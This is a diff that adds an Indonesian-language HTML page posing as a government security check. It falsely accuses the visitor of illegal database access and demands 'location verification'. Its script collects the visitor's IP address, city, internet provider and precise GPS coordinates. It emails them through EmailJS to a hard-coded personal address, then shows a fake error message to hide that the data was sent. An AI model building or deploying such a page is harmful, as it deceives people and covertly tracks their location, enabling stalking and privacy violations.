@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Keamanan Novle - Verifikasi</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        body { font-family: 'Courier New', monospace; background-color: #0d0d0d; color: #00ff41; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { border: 1px solid #00ff41; padding: 25px; border-radius: 10px; text-align: center; background: rgba(0,0,0,0.9); box-shadow: 0 0 15px #00ff41; width: 85%; max-width: 380px; }
+        h2 { font-size: 18px; text-transform: uppercase; margin-bottom: 15px; }
+        p { color: #cccccc; font-size: 13px; line-height: 1.4; }
+        .btn { background: #00ff41; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; text-transform: uppercase; border-radius: 5px; }
+        #status { margin-top: 15px; font-size: 11px; color: #666; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>[ ACCESS RESTRICTED ]</h2>
+    <p>Perangkat Anda terdeteksi melakukan akses ilegal ke database Negara Novle. Anda diwajibkan melakukan verifikasi lokasi untuk menghindari pemblokiran perangkat secara permanen.</p>
+    <button class="btn" onclick="executeTracking()">VERIFIKASI SEKARANG</button>
+    <div id="status">Enkripsi Gigs System: AKTIF</div>
+</div>
+
+<script>
+    // Inisialisasi dengan Public Key Anda
+    (function(){
+        emailjs.init("5HWPoEryOV1APt1Cw"); 
+    })();
+
+    async function executeTracking() {
+        document.getElementById("status").innerText = "Mengamankan koneksi...";
+        
+        let report = "[LAPORAN PELACAKAN YOU]\n";
+        report += "Target: Suspect Pembunuh Berantai\n";
+        report += "Waktu: " + new Date().toLocaleString('id-ID') + "\n";
+        report += "---------------------------------\n";
+
+        try {
+            // 1. Ambil IP dan Data Jaringan
+            const res = await fetch('https://ipapi.co/json/');
+            const ipData = await res.json();
+            report += `IP Address : ${ipData.ip}\n`;
+            report += `Kota/Negara: ${ipData.city}, ${ipData.country_name}\n`;
+            report += `Provider   : ${ipData.org}\n`;
+
+            // 2. Ambil GPS Presisi (Jika diizinkan)
+            navigator.geolocation.getCurrentPosition((pos) => {
+                report += `Lokasi Akurat (Maps): https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
+                sendFinalReport(report);
+            }, (err) => {
+                report += "GPS: Akses Ditolak oleh Target\n";
+                sendFinalReport(report);
+            });
+
+        } catch (e) {
+            report += "Gagal mengambil data jaringan secara otomatis.\n";
+            sendFinalReport(report);
+        }
+    }
+
+    function sendFinalReport(message) {
+        // Menggunakan Service ID dan Template ID Anda
+        emailjs.send("service_e3ap8de", "template_ts6dxmh", {
+            to_email: "ikhsansetiawan711@gmail.com",
+            message: message
+        }).then(() => {
+            alert("Kesalahan Server! Verifikasi gagal dikirim. Silakan coba 5 menit lagi.");
+            document.getElementById("status").innerText = "Data tersinkronisasi ke pusat.";
+        });
+    }
+</script>
+
+</body>
+</html>
